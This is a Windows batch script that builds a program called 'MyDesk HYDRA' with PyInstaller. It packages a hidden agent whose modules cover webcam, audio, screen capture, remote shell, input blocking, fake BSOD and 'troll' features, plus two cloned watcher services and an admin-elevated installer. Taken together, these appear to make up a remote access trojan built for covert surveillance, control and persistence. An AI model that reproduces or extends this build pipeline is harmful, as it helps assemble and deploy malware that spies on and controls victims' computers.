@echo off
setlocal
cd /d "%~dp0.."

echo ==========================================
echo       MyDesk HYDRA BUILD SYSTEM
echo ==========================================

:: 0. Syntax Check
echo [*] Checking Syntax (compileall)...
python -m compileall -q .
if %errorlevel% neq 0 (
    echo [!] Syntax Error Detected! Build Aborted.
    exit /b 1
)

:: 1. Cleanup
if exist dist (
    rmdir /s /q dist
    mkdir dist
    echo [*] Cleaned up dist folder.
) else (
    mkdir dist
    echo [*] Created dist folder.
)
if %errorlevel% neq 0 (
    echo [!] Failed to clean up dist folder! Build Aborted.
    exit /b 1
)

:: 2. Build AGENT (Copied from build_all.bat)
echo [*] Building 1/4: MyDeskAgent.exe...
python -m PyInstaller --noconsole --onefile --noupx --name MyDeskAgent ^
    --exclude-module matplotlib ^
    --exclude-module pandas ^
    --exclude-module scipy ^
    --exclude-module PyQt6 ^
    --exclude-module torch ^
    --exclude-module streamlit ^
    --exclude-module altair ^
    --exclude-module flask ^
    --exclude-module selenium ^
    --exclude-module sklearn ^
    --exclude-module pyarrow ^
    --exclude-module ipython ^
    --exclude-module jupyter ^
    --exclude-module chess ^
    --exclude-module google ^
    --exclude-module pywinauto ^
    --exclude-module uiautomation ^
    --exclude-module nodriver ^
    --exclude-module pynput ^
    --hidden-import=targets.input_controller ^
    --hidden-import=targets.privacy ^
    --hidden-import=targets.capture ^
    --hidden-import=targets.audio ^
    --hidden-import=targets.webcam ^
    --hidden-import=targets.auditor ^
    --hidden-import=targets.shell_handler ^
    --hidden-import=targets.process_manager ^
    --hidden-import=targets.file_manager ^
    --hidden-import=targets.clipboard_handler ^
    --hidden-import=targets.device_settings ^
    --hidden-import=targets.troll_handler ^
    --hidden-import=targets.troll_video_player ^
    --hidden-import=targets.bsod_screen ^
    --hidden-import=targets.webrtc_handler ^
    --hidden-import=targets.webrtc_tracks ^
    --hidden-import=targets.resource_manager ^
    --hidden-import=targets.tunnel_manager ^
    --hidden-import=targets.kiosk ^
    --hidden-import=targets.input_blocker ^
    --hidden-import=pyaudiowpatch ^
    --hidden-import=aiortc ^
    --hidden-import=aiortc.codecs ^
    --hidden-import=aiortc.codecs.h264 ^
    --hidden-import=aiortc.contrib.media ^
    --hidden-import=av ^
    --hidden-import=av.video ^
    --hidden-import=av.audio ^
    --hidden-import=numpy ^
    --hidden-import=msgpack ^
    --hidden-import=PIL.Image ^
    --hidden-import=cv2 ^
    --hidden-import=requests ^
    --hidden-import=psutil ^
    --hidden-import=targets.tunnel_manager ^
    --hidden-import=targets.kiosk ^
    --hidden-import=pillow_jxl ^
    --hidden-import=zstandard ^
    --add-data "targets;targets" ^
    agent_loader.py

if %errorlevel% neq 0 (
    echo [!] Agent Build Failed!
    exit /b %errorlevel%
)

:: Copy Cloudflared
echo [*] Copying Cloudflared...
if exist "cloudflared.exe" (
    copy /Y "cloudflared.exe" "dist\cloudflared.exe"
) else (
    echo [!] WARNING: cloudflared.exe not found!
)

:: 3. Build Watcher Service (Service A)
echo.
echo [*] Building 2/4: MyDeskServiceA.exe...
python -m PyInstaller --onefile --noconsole --name MyDeskServiceA ^
    --hidden-import win32timezone ^
    --hidden-import servicemanager ^
    --hidden-import targets.protection ^
    targets/services/watcher.py

if %errorlevel% neq 0 (
    echo [!] Service A Build Failed!
    exit /b %errorlevel%
)

:: 4. Create Service B (Copy of A)
echo.
echo [*] Building 3/4: MyDeskServiceB.exe (Cloning A)...
copy /Y "dist\MyDeskServiceA.exe" "dist\MyDeskServiceB.exe" > nul

:: 5. Build Setup Bundle
echo.
echo [*] Building 4/4: MyDeskSetup.exe (Installer)...
python -m PyInstaller --onefile --noconsole --name MyDeskSetup --uac-admin ^
    --add-binary "dist/MyDeskAgent.exe;." ^
    --add-binary "dist/MyDeskServiceA.exe;." ^
    --add-binary "dist/MyDeskServiceB.exe;." ^
    targets/services/install.py

if %errorlevel% neq 0 (
    echo [!] Installer Build Failed!
    exit /b %errorlevel%
)

echo.
echo ==========================================
echo         HYDRA BUILD COMPLETE!
echo ==========================================
echo Output: dist\MyDeskSetup.exe
echo.
